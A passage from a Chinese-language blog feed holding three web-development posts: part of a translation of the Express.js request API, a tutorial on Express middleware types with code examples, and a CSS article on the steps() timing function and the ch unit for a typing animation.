params:undefind,</span><br><span class="line">            path:undefind,</span><br><span class="line">            keys:[],</span><br><span class="line">            regexp:<span class="regexp">/^\/?$/i</span>,</span><br><span class="line">            method:<span class="string">'get'</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    methods:&#123;<span class="attr">get</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="req-secure"><a href="#req-secure" class="headerlink" title="req.secure"></a>req.secure</h3><p>如果建立的TSL连接，则为真的布尔值，相当于</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'https'</span> == req.protocol;</span><br></pre></td></tr></table></figure><h3 id="req-signedCookies"><a href="#req-signedCookies" class="headerlink" title="req.signedCookies"></a>req.signedCookies</h3><p>当使用<code>cookie-parser</code>中间件时，此属性包含请求发送签署的cookie，为签名并以准备好使用，签署的cookie驻留在不同的对象中以显示开发人员的意图.否者，恶意攻击可以放置req.cookie值(这是容易欺骗的).注意签署cookie并不能使其隐藏或加密，当时简单的防止篡改（因为用于签署的secret是私有的）.如果没有发送签署的cookie，则默认为{}</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Cookie: user=tobi.CP7AWaXDfAKIRfH49dQzKJx7sKzzSoPq7/AcBBRVwlI3</span></span><br><span class="line">req.signedCookies.user  <span class="comment">// =&gt; "tobi"</span></span><br></pre></td></tr></table></figure><h3 id="req-stale"><a href="#req-stale" class="headerlink" title="req.stale"></a>req.stale</h3><p>指示是否请求是<code>stable</code>,和它对应的是<code>req.fresh</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">req.stable  <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="req-subdomains"><a href="#req-subdomains" class="headerlink" title="req.subdomains"></a>req.subdomains</h3><p>请求的域名中的一组子域</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HOST： 'tobi.ferrets.example.com'</span></span><br><span class="line">req.subdomains  <span class="comment">// =&gt; ["tobi","ferrets"]</span></span><br></pre></td></tr></table></figure><h3 id="req-xhr"><a href="#req-xhr" class="headerlink" title="req.xhr"></a>req.xhr</h3><p>如果请求的<code>X-Requsested-With</code>头域是<code>XMLHttpRequest</code>，布尔值为true.指示请求是由一个客户库（如jQuery）发出的</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">req.xhr <span class="comment">// =&gt; true</span></span><br></pre></td></tr></table></figure><h2 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h2><h3 id="req-accepts-types"><a href="#req-accepts-types" class="headerlink" title="req.accepts(types)"></a>req.accepts(types)</h3><p>检查指定的内容类型是否可接受，基于请求的<code>Accept</code>http字段.该方法返回最佳匹配,或者如果没有指定内容类型是可以接受的，返回<code>undefined</code>(在这种情况下，应用程序回应以406<code>Not Acceptable</code>)</p><p>类型值可以是单个MIME类型字符串（例如’application/json’）,一个扩展名例如’.json’,逗号分割的列表或者是一个数组.对于列表和数组，该方法返回最佳匹配（如果有的话）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Accept : text/html</span></span><br><span class="line">req.accepts(<span class="string">'html'</span>)    <span class="comment">// =&gt; "html"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Accept : text/*,application/json</span></span><br><span class="line">req.accepts(<span class="string">'html'</span>)  <span class="comment">// =&gt; "html"</span></span><br><span class="line">req.accepts(<span class="string">'text/html'</span>) <span class="comment">// =&gt;  'text/html'</span></span><br><span class="line">req.accepts([<span class="string">'json'</span>,<span class="string">'text'</span>]) <span class="comment">// =&gt; 'json'</span></span><br><span class="line">req.accepts(<span class="string">'application/json'</span>) <span class="comment">// =&gt; 'application/json'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Accepts : text/*,application/json</span></span><br><span class="line">req.accepts(<span class="string">'image/png'</span>);</span><br><span class="line">req.accepts(<span class="string">'png'</span>)   <span class="comment">// =&gt; undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Accept: text/*;q=.5,application/json</span></span><br><span class="line">req.accepts([<span class="string">'html'</span>,<span class="string">'json'</span>]) <span class="comment">// =&gt; json</span></span><br></pre></td></tr></table></figure><h3 id="req-acceptsCharsets-charset-…"><a href="#req-acceptsCharsets-charset-…" class="headerlink" title="req.acceptsCharsets(charset[,…])"></a>req.acceptsCharsets(charset[,…])</h3><p>基于请求的<code>Accept-Charset</code>HTTP头字段，返回第一个接受指定字符集的字符集.如果指定的字符集都不接受，返回<code>false</code></p><h3 id="req-acceptsEncodings-encoding-…"><a href="#req-acceptsEncodings-encoding-…" class="headerlink" title="req.acceptsEncodings(encoding[,…])"></a>req.acceptsEncodings(encoding[,…])</h3><p>基于请求的<code>Accept-Encoding</code>http字段，返回第一个接受的指定编码.如果指定的编码是没有接受的，返回<code>false</code></p><h3 id="req-acceptsLanguages-lang-…"><a href="#req-acceptsLanguages-lang-…" class="headerlink" title="req.acceptsLanguages[lang[,…]]"></a>req.acceptsLanguages[lang[,…]]</h3><p>基于请求的<code>Accept-Language</code>http字段，返回指定语言的第一个已接受语言.如果没有指定的语言被接受，返回<code>fasle</code></p><h3 id="req-get-field"><a href="#req-get-field" class="headerlink" title="req.get(field)"></a>req.get(field)</h3><p>返回指定http请求头字段（大小写不敏感匹配），这个<code>Referrer</code>和<code>Referer</code>字段可以互换</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">req.get(<span class="string">'Content-Type'</span>); <span class="comment">// =&gt; 'text/plain'</span></span><br><span class="line">req.get(<span class="string">'content-type'</span>); <span class="comment">// =&gt; 'text/plain'</span></span><br><span class="line">req.get(<span class="string">'Something'</span>) <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><p>别名<code>req.header(field)</code></p><h3 id="req-is-type"><a href="#req-is-type" class="headerlink" title="req.is(type)"></a>req.is(type)</h3><p>如果传入的请求的HTTP头字段与type类型的参数指定的MIME类型匹配，返回true。否者返回false</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// when content-type:text/html;charset=utf-8</span></span><br><span class="line">req.is(<span class="string">'html'</span>)</span><br><span class="line">req.is(<span class="string">'text/html'</span>)</span><br><span class="line">req.is(<span class="string">'text/*'</span>)</span><br><span class="line"><span class="comment">// =&gt; true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// when content-type is application/json</span></span><br><span class="line">req.is(<span class="string">'json'</span>)</span><br><span class="line">req.is(<span class="string">'application/json'</span>)</span><br><span class="line">req.is(<span class="string">'application/*'</span>)</span><br><span class="line"><span class="comment">// =&gt; true</span></span><br><span class="line"></span><br><span class="line">req.is(<span class="string">'html'</span>)</span><br><span class="line"><span class="comment">// =&gt; false</span></span><br></pre></td></tr></table></figure><h3 id="req-param-name-defaultValue"><a href="#req-param-name-defaultValue" class="headerlink" title="req.param(name,[,defaultValue])"></a>req.param(name,[,defaultValue])</h3><blockquote><p>过时的，使用<code>req.body,req.params,req.query</code>,如适用</p></blockquote><p>返回参数名的值时</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ?name=tobi</span></span><br><span class="line">req.param(<span class="string">'name'</span>)   <span class="comment">// =&gt; 'tobi'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// POST name=tobi</span></span><br><span class="line">req.param(<span class="string">'name'</span>)  <span class="comment">// =&gt; 'tobi'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /user/tobi for /user/:name</span></span><br><span class="line">req.param(<span class="string">'name'</span>) <span class="comment">// =&gt; 'tobi'</span></span><br></pre></td></tr></table></figure><p>按以下顺序执行查找，</p><ul><li>req.params</li><li>req.body</li><li>req.query</li></ul><blockquote><p>直接访问req.params,req.body,req.query应该是被视为清晰可赞扬的-除非你真正接受每个对象的输入。<code>Body-parsing</code>必须被加载为了<code>req.param</code>正常的使用</p></blockquote><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>Express文档中Request部分就完成了，本人学识有限，难免有所纰漏，另外翻译仅仅是方便个人学习交流使用，无其他用意，原文地址：<a href="http://www.expressjs.com.cn/4x/api.html#req" target="_blank" rel="noopener">expressjs.com</a></p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node </tag>
            
            <tag> Express </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>express中间件</title>
      <link href="/2017/12/18/express-middleware-use/"/>
      <url>/2017/12/18/express-middleware-use/</url>
      
        <content type="html"><![CDATA[<h1 id="底层：http模块"><a href="#底层：http模块" class="headerlink" title="底层：http模块"></a>底层：http模块</h1><p>express目前是最流行的基于Node.js的web开发框架，express框架建立在内置的http模块上，</p><a id="more"></a><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="keyword">var</span>  app = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>,&#123;<span class="string">"Content-type"</span>:<span class="string">"text/plain"</span>&#125;);</span><br><span class="line">    res.end(<span class="string">'hello world'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>,<span class="string">'lcoalhost'</span>)</span><br></pre></td></tr></table></figure><p>上面代码的关键是使用<code>createServer</code>方法，生成一个HTTP的服务器实例。该方法接受一个回调函数，回调函数的参数分别代表HTTP请求和HTTP回应的<code>request</code>和<code>response</code>对象</p><p>Experss框架的核心是对http模块的再包装，</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> port  = process.env.PORT || <span class="number">3000</span></span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line">app.get(<span class="string">'/'</span>,fcuntion(req,res)&#123;</span><br><span class="line">  res.send(<span class="string">'hello world'</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.listen(port)</span><br></pre></td></tr></table></figure><p>比较<code>http.createServer()</code>方法创建一个app实例和Express的构造方法，生成一个Express实例，两者的回调函数都是相同的。Express框架等于在http模块之上，加了一个中间层</p><h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><p>Express是一个自身功能极简单，完全由<code>路由</code>和<code>中间件</code>构成的web开发框架，从本质上说，一个Express应用是在调用各种中间件</p><p><code>中间件(middleware)</code>是一个函数,他可以访问请求对象（request object(req)）,响应对象（response object(res)）和web应用中处于请求-响应循环</p><p>Express可以使用如下几种中间件：</p><pre><code>- 应用级中间件- 路由级中间件- 错误处理中间件- 内置中间件- 第三方中间件</code></pre><h1 id="应用级中间件"><a href="#应用级中间件" class="headerlink" title="应用级中间件"></a>应用级中间件</h1><p>应用级中间键绑定到<code>app对象</code>使用<code>app.use</code>和<code>app.METHOD()-需要处理http请求的方法，例如GET、PUT、POST</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 没有挂载路径的中间件，应用中的每个请求都会执行该中间件</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req,res,next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Time'</span>,Dtae.now());</span><br><span class="line">    next(); <span class="comment">// 传递request对象给下一个中间件</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挂载至/user/:id的中间件，任何执行/user/:id的请求都会执行它</span></span><br><span class="line">app.use(<span class="string">'/use/:id'</span>,(req,res,next) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Request Type'</span>,req.method);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由和句柄函数（中间件系统），处理指向/user/:id的GET请求</span></span><br><span class="line">app.get(<span class="string">'/user/:id'</span>,(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'USER'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="http://www.chenqaq.com/assets/images/middlewarp1.png" alt="$ node app"><br><img src="http://www.chenqaq.com/assets/images/middlewarp2.png" alt="result"></p><p>如果我们想要<code>处理挂在至/user/:id</code>的中间件的GET请求，我们需要使用<code>next()</code>将<code>request</code>对象传递给下一个中间件</p><p>否者：<br><img src="http://www.chenqaq.com/assets/images/middlewarp3.png" alt="error"> </p><p>得不到下一个中间件处理的它，一直在等待…<br>最终会抛出localhost未发送任何数据的错误</p><p><img src="http://www.chenqaq.com/assets/images/middlewarp4.png" alt="error"></p><p>如何你不想要终止<code>请求-响应循环</code>,总是记得通过<code>next()</code>传递request对象</p><hr><p>如果你想要在中间件栈中跳过剩余中间件，调用next(‘route’)方法将控制权交给下一个路由</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/user/:id'</span>,(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.params.id==<span class="number">0</span>) next(<span class="string">'route'</span>)</span><br><span class="line">    <span class="keyword">else</span> next()</span><br><span class="line">&#125;,(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="comment">// 渲染常规页面</span></span><br><span class="line">    res.render(<span class="string">'regular'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理/user/:id，渲染一个id为0的特殊页面</span></span><br><span class="line">app.get(<span class="string">'/user/:id'</span>,(req,res,next)=&gt;&#123;</span><br><span class="line">    res.render(<span class="string">'special'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="路由级中间件"><a href="#路由级中间件" class="headerlink" title="路由级中间件"></a>路由级中间件</h1><p>路由级中间件和应用级中间件类似，只不过是它绑定对象为<code>express.Router()</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> router = express.Router()</span><br></pre></td></tr></table></figure><p>路由级使用<code>router.use()</code>或<code>router.VERB()</code>加载</p><p>举个栗子</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"><span class="keyword">var</span> router = express.Router()</span><br><span class="line"><span class="comment">// 没有挂载路径的中间件，通过该路由的每个请求都会执行该中间件</span></span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Time:'</span>, <span class="built_in">Date</span>.now());</span><br><span class="line">  next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个中间件，显示任何指向/user/:id的HTTP请求的信息</span></span><br><span class="line">router.use(<span class="string">'/user/:id'</span>,(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Request URL'</span>,req.originalUrl)</span><br><span class="line">    next()</span><br><span class="line">&#125;,(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Request Type'</span>,req.method)</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个中间件栈，处理指向/user/:id的GET请求</span></span><br><span class="line">router.get(<span class="string">'/user/:id'</span>,(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.params.id == <span class="number">0</span>) next(<span class="string">'router'</span>)</span><br><span class="line">    <span class="keyword">else</span> next()</span><br><span class="line">&#125;,(req,res,next)=&gt;&#123;</span><br><span class="line">    res.render(<span class="string">'regular'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理/user/:id，渲染一个特殊页面</span></span><br><span class="line">router.get(<span class="string">'user/:id'</span>,(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(req.params.id)</span><br><span class="line">    res.render(<span class="string">'special'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将路由挂载至应用</span></span><br><span class="line">app.use(<span class="string">'/'</span>,router)</span><br></pre></td></tr></table></figure><h1 id="错误处理中间件"><a href="#错误处理中间件" class="headerlink" title="错误处理中间件"></a>错误处理中间件</h1><blockquote><p>错误处理中间件有四个参数,定义错误处理中间件必须使用这四个参数。即使不需要next对象，也必须在参数中声明它，否者中间件会识别为一个常规中间件，不能处理错误</p></blockquote><p>举个栗子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(<span class="function">(<span class="params">err,req,res,next</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.error(err.stack)</span><br><span class="line">    res.status(<span class="number">500</span>).send(<span class="string">'Something broke'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>中间件返回的响应是随意的，可以响应一个 HTML 错误页面、一句简单的话、一个 JSON 字符串，或者其他任何您想要的东西。</p><p>所以你可能想要像处理常规中间件那样，定义多个错误处理中间件<br>,比如您想为使用 XHR 的请求定义一个，还想为没有使用的定义一个，那么：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(logErrors)</span><br><span class="line">app.use(clientErrorHandler)</span><br><span class="line">app.use(errorHandler)</span><br></pre></td></tr></table></figure><p><code>logErrors</code> 将请求和错误信息写入标准错误输出、日志或者类似服务</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logErrors</span>(<span class="params">err,req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.error(err.stack)</span><br><span class="line">    next(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>clientErrorHandler</code> 定义如下(这里将错误直接传给了next)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clientErrorHandler</span>(<span class="params">err,req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.xhr)&#123;</span><br><span class="line">        res.status(<span class="number">500</span>).send(&#123;<span class="attr">error</span>:<span class="string">'Something blew up!'</span>&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        next(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>errorHandler</code> 捕获所有错误</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">errorHandler</span>(<span class="params">err,req,res,next</span>)</span>&#123;</span><br><span class="line">    res.status(<span class="number">500</span>)</span><br><span class="line">    res.render(<span class="string">'error'</span>,&#123;<span class="attr">error</span>:err&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="内置中间件"><a href="#内置中间件" class="headerlink" title="内置中间件"></a>内置中间件</h1><p>从版本4.x开始，Express不再依赖<code>Content</code>，除了 <code>express.static</code>, Express 以前内置的中间件现在已经全部单独作为模块安装使用</p><p><code>express.static</code>是 Express 唯一内置的中间件。<br>它基于 <code>serve-static</code>，负责在 Express 应用中提托管静态资源。</p><p>可选<code>options</code>参数拥有如下属性</p><table><thead><tr><th>属性</th><th>描述</th><th>类型</th><th>缺省值</th></tr></thead><tbody><tr><td>dotfiles</td><td>是否对外输出文件名以点（.）开头的文件。可选值为 “allow”、“deny” 和 “ignore”</td><td>String</td><td>“ignore”</td></tr><tr><td>etag</td><td>是否启用etag生成</td><td>Boolean</td><td>true</td></tr><tr><td>extensions</td><td>设置文件扩展名备份选项</td><td>Array</td><td>[ ]</td></tr><tr><td>index</td><td>发送目录索引文件，设置为 false 禁用目录索引。</td><td>mixed</td><td>“index.html”</td></tr><tr><td>lastModified</td><td>设置 Last-Modified 头为文件在操作系统上的最后修改日期</td><td>Boolean</td><td>true</td></tr><tr><td>maxAge</td><td>毫秒或者其字符串格式设置 Cache-Control 头的 max-age 属性</td><td>Number</td><td>0</td></tr><tr><td>redirect</td><td>当路径为目录时，重定向至”/“</td><td>Boolean</td><td>true</td></tr><tr><td>setHeaders</td><td>设置HTTP头以提供文件的函数</td><td>Function</td><td></td></tr><tr><td>下面的栗子使用了 <code>express.static</code> 中间件，其中的 <code>options</code> 对象经过了精心的设计。</td><td></td><td></td><td></td></tr><tr><td><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">  dotfiles: <span class="string">'ignore'</span>,</span><br><span class="line">  etag: <span class="literal">false</span>,</span><br><span class="line">  extensions: [<span class="string">'htm'</span>, <span class="string">'html'</span>],</span><br><span class="line">  index: <span class="literal">false</span>,</span><br><span class="line">  maxAge: <span class="string">'1d'</span>,</span><br><span class="line">  redirect: <span class="literal">false</span>,</span><br><span class="line">  setHeaders: <span class="function"><span class="keyword">function</span> (<span class="params">res, path, stat</span>) </span>&#123;</span><br><span class="line">    res.set(<span class="string">'x-timestamp'</span>, <span class="built_in">Date</span>.now());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(express.static(<span class="string">'public'</span>, options));</span><br></pre></td></tr></table></figure></td><td></td><td></td><td></td></tr><tr><td>我们总是需要使用<code>express.static</code>指定多个静态资源文件，比如：</td><td></td><td></td><td></td></tr><tr><td><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(express.static(<span class="string">'public'</span>))</span><br><span class="line">app.use(express.static(<span class="string">'files'</span>))</span><br></pre></td></tr></table></figure></td><td></td><td></td><td></td></tr></tbody></table><h1 id="第三方中间件"><a href="#第三方中间件" class="headerlink" title="第三方中间件"></a>第三方中间件</h1><p>通过使用第三方中间件从而为Express应用增加更多的功能<br>安装所需功能的node模块，并在应用中加载，可以在应用级中加载，也可以在路由级中加载</p><p>举个栗子</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ npm install cookie-parser</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">'cookie-parser'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载用于解析cookie的中间件</span></span><br><span class="line">app.use(cookieParser())</span><br></pre></td></tr></table></figure><p><a href="http://www.expressjs.com.cn/resources/middleware.html" target="_blank" rel="noopener">express部分第三方中间件</a></p><p>参考资料</p><ul><li><a href="http://www.expressjs.com.cn/guide/using-middleware.html" target="_blank" rel="noopener">expressjs.com</a></li><li><a href="http://javascript.ruanyifeng.com/nodejs/express.html#toc6" target="_blank" rel="noopener">express框架-阮一峰老师</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node </tag>
            
            <tag> Express </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>过渡与动画 - steps调速函数&amp;CSS值与单位之ch</title>
      <link href="/2017/12/13/css-animation-frameBYframe/"/>
      <url>/2017/12/13/css-animation-frameBYframe/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>上一篇中我们熟悉五种内置的缓动曲线和(三次)贝塞尔曲线，并且基于此完成了缓动效果.</p><p>但是如果我们想要实现逐帧动画，基于贝塞尔曲线的调速函数就显得有些无能为力了，因为我们并不需要<code>帧与帧之间的过渡状态</code>，就像上篇中所看到的，所有基于贝塞尔曲线的调速函数都会在关键帧之间进行插值运算，从而产生平滑的过渡效果。</p><p>这个特性显然很棒，平滑的效果确实是我们使用css过渡和动画所追求的。</p><p>但是在逐帧动画的场景下，这种平滑的特性恰恰毁掉了我们想要实现的逐帧动画的效果.</p><a id="more"></a><p><img src="http://www.chenqaq.com/assets/photos/yi.png" alt=""></p><h1 id="逐帧动画"><a href="#逐帧动画" class="headerlink" title="逐帧动画"></a>逐帧动画</h1><p>我们经常会看到一段卡通影片、一个复杂进度的提示框、一个小loading，<br>我们不会单纯的选择一张GIF动画胜任，因为它的局限性和短板表现的很明显.</p><ul><li>GIF图片所能使用的颜色数量被限制在256色</li><li>GIF不具有Alpha透明的特性，</li><li>GIF动画一旦生成，参数就固定在文件内部，只能通过图像处理软件去重新生成.<br>在某些场景下，基于图片的逐帧动画成了不错的选择。</li></ul><p><img src="http://www.chenqaq.com/assets/images/loading.jpg" alt=""></p><h1 id="steps-调速函数"><a href="#steps-调速函数" class="headerlink" title="steps()调速函数"></a>steps()调速函数</h1><p>写在前面中提到，我们不能基于贝塞尔曲线的调速函数完成我们所需要的逐帧动画，那么采用什么调速函数呢？</p><p>对，答案就是<code>steps()</code>调速函数,与贝塞尔曲线迥然不同的是，<code>steps()</code>会根据你指定的步进数量，把动画分为很多帧，而且整个动画会在<code>帧与帧之间硬切</code>,不会像贝塞尔曲线那样做插值处理。</p><p><img src="http://www.chenqaq.com/assets/images/xy.png" alt="对比step(8)、linear以及默认ease的差异"></p><p>通过上图我们可以很明显看出steps(8)、linear和ease的区别.</p><p>其实这种硬切效果是我们极力避免的，因此我们也很少听到关于<code>steps()</code>的讨论。在CSS调速函数的世界里，基于<code>贝塞尔曲线</code>的调速函数就像是被人追捧的白天鹅，而<code>steps()</code>则是旁人唯恐不及的丑小鸭。</p><p><img src="http://www.chenqaq.com/assets/photos/ch.jpg" alt=""></p><p>其实无所谓好与不好，更多的是适合与不适合，我们都崇拜的贝塞尔曲线在像小”loading”这样的逐帧动画中失败了，而<code>steps()</code>却展示出我们想要的效果.</p><p>这个想法最初是Simurai在他的博客中推出<a href="http://simurai.com/blog/2012/12/03/step-animation" target="_blank" rel="noopener">http://simurai.com/blog/2012/12/03/step-animation</a>，他使用<code>steps()</code>实现拼合图片的动画效果.让人印象深刻 </p><iframe height='265' scrolling='no' title='Steps Animation' src='//codepen.io/simurai/embed/tukwj/?height=265&theme-id=dark&default-tab=css,result&embed-version=2' frameborder='no' allowtransparency='true' allowfullscreen='true' style='width: 100%;margin-top:20px'>See the Pen <a href='https://codepen.io/simurai/pen/tukwj/' target="_blank" rel="noopener">Steps Animation</a> by simurai (<a href='https://codepen.io/simurai' target="_blank" rel="noopener">@simurai</a>) on <a href='https://codepen.io' target="_blank" rel="noopener">CodePen</a>.</iframe><h1 id="ch单位-css值与单位第三版"><a href="#ch单位-css值与单位第三版" class="headerlink" title="ch单位 - css值与单位第三版"></a>ch单位 - css值与单位第三版</h1><p>有时候，我们希望一段为本字符逐个显示，模拟出一种打字的效果。这种效果在技术类网站中尤为常见，用等宽字体可以营造出一种终端命令行的感觉.</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>CSS is amazing!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">keyframes</span> typing&#123;</span><br><span class="line">    <span class="selector-tag">from</span>&#123;<span class="attribute">width</span>:<span class="number">0</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h1</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">7.7em</span>;</span><br><span class="line">    <span class="attribute">white-space</span>:nowrap;</span><br><span class="line">    <span class="attribute">overflow</span>:hidden;</span><br><span class="line">    <span class="attribute">animation</span>:typing <span class="number">8s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们想要模拟出一种打字效果，但是</p><ul><li>整个动画是平滑连贯的，而不是逐字显示</li><li>目前我们已经使用em指定宽度是7.7，虽然他比像素单位好一些，但是仍然不够理想，这个宽度为什么是7.7em.</li></ul><p><img src="http://www.chenqaq.com/assets/photos/mi.jpg" alt=""></p><p>我们很自然的想到了使用<code>steps()</code>来修复第一个问题，但是不幸的是，我们所需要的步进数量是由字符的数量来决定的</p><p><code>CSS值与单位(第三版)</code>规范引入了一个新的单位，表示”0”字形的宽度。大多数场景下，我们不必关心”0”字形的宽度到底有多宽，因为在等宽字体中，”0”字形的宽度和其他所有字形的宽度是一样的。因此，我们如果使用ch单位来表示h1的宽度，那取值实际上就是字符的数量：在上面的例子中就是15</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">keyframes</span> typing&#123;</span><br><span class="line">    <span class="selector-tag">from</span>&#123; <span class="attribute">width</span>:<span class="number">0</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">keyframes</span> caret&#123;</span><br><span class="line">    50%&#123; <span class="attribute">border-color</span>:transparent &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h1</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">15ch</span>;</span><br><span class="line">    <span class="attribute">overflow</span>:hidden;</span><br><span class="line">    <span class="attribute">white-space</span>:nowrap;</span><br><span class="line">    <span class="attribute">border-right</span>:<span class="number">0.5em</span> solid;</span><br><span class="line">    <span class="attribute">animation</span>:typing <span class="number">6s</span> <span class="built_in">steps</span>(15),caret <span class="number">1s</span> <span class="built_in">steps</span>(1) infinite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们还是有些疑问：</p><ul><li>这样的代码是不易维护的，当更新标题的时候，我们总是需要根据字符的数量来指定不同的宽度样式和<code>steps()</code>函数，这时候正是JavaScript的用武之地<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span 